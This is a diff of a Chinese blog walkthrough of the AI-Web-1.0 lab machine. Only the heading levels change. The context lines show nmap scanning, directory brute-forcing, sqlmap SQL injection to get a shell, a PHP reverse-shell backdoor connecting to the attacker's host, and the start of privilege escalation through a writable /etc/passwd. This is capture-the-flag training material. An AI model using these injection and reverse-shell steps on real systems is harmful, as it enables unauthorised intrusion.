@@ -122,13 +122,13 @@
     <div class="post-toc" id="post-toc">
     <h2 class="post-toc-title">Contents</h2>
     <div class="post-toc-content">
-      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#第一步、主机发现"><span class="toc-text">第一步、主机发现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第二步、端口扫描"><span class="toc-text">第二步、端口扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第三步、web信息收集"><span class="toc-text">第三步、web信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第四步、sqlmap自动化注入"><span class="toc-text">第四步、sqlmap自动化注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第五步、sqlmap反弹shell"><span class="toc-text">第五步、sqlmap反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第六步、php后门反弹shell"><span class="toc-text">第六步、php后门反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第七步、提权获得flag"><span class="toc-text">第七步、提权获得flag</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#第一步、主机发现"><span class="toc-text">第一步、主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第二步、端口扫描"><span class="toc-text">第二步、端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第三步、web信息收集"><span class="toc-text">第三步、web信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第四步、sqlmap自动化注入"><span class="toc-text">第四步、sqlmap自动化注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第五步、sqlmap反弹shell"><span class="toc-text">第五步、sqlmap反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第六步、php后门反弹shell"><span class="toc-text">第六步、php后门反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第七步、提权获得flag"><span class="toc-text">第七步、提权获得flag</span></a></li></ol>
     </div>
-  </div><div class="post-content"><h4 id="第一步、主机发现"><a href="#第一步、主机发现" class="headerlink" title="第一步、主机发现"></a>第一步、主机发现</h4><p>我们尝试使用nmap的二层发现功能进行主机扫描</p>
+  </div><div class="post-content"><h3 id="第一步、主机发现"><a href="#第一步、主机发现" class="headerlink" title="第一步、主机发现"></a>第一步、主机发现</h3><p>我们尝试使用nmap的二层发现功能进行主机扫描</p>
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn <span class="number">192.168</span><span class="number">.153</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206185007.png" alt></p>
-<h4 id="第二步、端口扫描"><a href="#第二步、端口扫描" class="headerlink" title="第二步、端口扫描"></a>第二步、端口扫描</h4><p>我们初步确定靶机IP为192.168.153.135后，继续使用nmap进行端口扫描和信息收集。</p>
+<h3 id="第二步、端口扫描"><a href="#第二步、端口扫描" class="headerlink" title="第二步、端口扫描"></a>第二步、端口扫描</h3><p>我们初步确定靶机IP为192.168.153.135后，继续使用nmap进行端口扫描和信息收集。</p>
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p <span class="number">1</span><span class="number">-65535</span> <span class="number">192.168</span><span class="number">.153</span><span class="number">.135</span> -T4</span><br></pre></td></tr></table></figure>
 
 
@@ -137,7 +137,7 @@
 <p>我们发现靶机的80端口上运行apache服务，并且发现了一个文件上传的目录</p>
 <p>我们尝试访问该ip的80端口,发现页面只有一句没什么用的话。。。</p>
 <p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206185640.png" alt></p>
-<h4 id="第三步、web信息收集"><a href="#第三步、web信息收集" class="headerlink" title="第三步、web信息收集"></a>第三步、web信息收集</h4><p>我们使用dirsearch工具尝试扫一下网站的目录。</p>
+<h3 id="第三步、web信息收集"><a href="#第三步、web信息收集" class="headerlink" title="第三步、web信息收集"></a>第三步、web信息收集</h3><p>我们使用dirsearch工具尝试扫一下网站的目录。</p>
 <figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb <span class="string">http:</span><span class="comment">//192.168.153.135</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206185739.png" alt></p>
@@ -147,7 +147,7 @@
 <p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206190345.png" alt></p>
 <p>我们输入任意数字，进行抓包判断，发现明显的注入点uid。使用sqlmap进行自动化扫描。</p>
 <p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206190358.png" alt></p>
-<h4 id="第四步、sqlmap自动化注入"><a href="#第四步、sqlmap自动化注入" class="headerlink" title="第四步、sqlmap自动化注入"></a>第四步、sqlmap自动化注入</h4><p>我们使用sqlmap进行自动化扫描。</p>
+<h3 id="第四步、sqlmap自动化注入"><a href="#第四步、sqlmap自动化注入" class="headerlink" title="第四步、sqlmap自动化注入"></a>第四步、sqlmap自动化注入</h3><p>我们使用sqlmap进行自动化扫描。</p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://192.168.153.135/se3reTdir777/"</span> <span class="params">--data</span> <span class="string">"uid=1&amp;peration=Submit"</span> <span class="params">--dbs</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>
 
 <p>得到了我们想要的数据库 aiweb1</p>
@@ -161,7 +161,7 @@
 
 <p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206190849.png" alt></p>
 <p>发现没有我们想要的信息。。。。。。只能换思路。</p>
-<h4 id="第五步、sqlmap反弹shell"><a href="#第五步、sqlmap反弹shell" class="headerlink" title="第五步、sqlmap反弹shell"></a>第五步、sqlmap反弹shell</h4><p>我们发现之前robots下存在一个 /m3diNf0/ 目录禁止访问，我们这里再次对其进行爆破。</p>
+<h3 id="第五步、sqlmap反弹shell"><a href="#第五步、sqlmap反弹shell" class="headerlink" title="第五步、sqlmap反弹shell"></a>第五步、sqlmap反弹shell</h3><p>我们发现之前robots下存在一个 /m3diNf0/ 目录禁止访问，我们这里再次对其进行爆破。</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">153.135</span><span class="regexp">/m3diNf0/</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200215110747.png" alt></p>
@@ -176,7 +176,7 @@
 <p>​                2:custom location</p>
 <p>网站路径：/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/</p>
 <p>​                PS：优先选择此路径的原因是sql注入在该页面下。</p>
-<h4 id="第六步、php后门反弹shell"><a href="#第六步、php后门反弹shell" class="headerlink" title="第六步、php后门反弹shell"></a>第六步、php后门反弹shell</h4><p>​    提示需要一个终端，所以我们得想办法反弹一个shell。在这里我们已经得到一个shell，可以写一个后门，在这里写一个php后门。</p>
+<h3 id="第六步、php后门反弹shell"><a href="#第六步、php后门反弹shell" class="headerlink" title="第六步、php后门反弹shell"></a>第六步、php后门反弹shell</h3><p>​    提示需要一个终端，所以我们得想办法反弹一个shell。在这里我们已经得到一个shell，可以写一个后门，在这里写一个php后门。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock=fsockopen(<span class="string">"192.168.153.152"</span>,<span class="number">4567</span>);</span><br><span class="line">exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 
@@ -191,7 +191,7 @@
 <p>然后我们在使用php命令运行我们下载的php后门。</p>
 <p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200215114646.png" alt></p>
 <p>我们可以发现kali已经成功反弹shell。</p>
-<h4 id="第七步、提权获得flag"><a href="#第七步、提权获得flag" class="headerlink" title="第七步、提权获得flag"></a>第七步、提权获得flag</h4><p>我们首先使用ptthon提升为交互式shell:</p>
+<h3 id="第七步、提权获得flag"><a href="#第七步、提权获得flag" class="headerlink" title="第七步、提权获得flag"></a>第七步、提权获得flag</h3><p>我们首先使用ptthon提升为交互式shell:</p>
 <figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
 
 <p>​    发现当前用户不是root用户但是这个用户可以对/etc/passwd 文件进行写入权限，所以我们试着添加一个用户看看： 因为写入的时候密码是加密的，所以要先加密密码:</p>
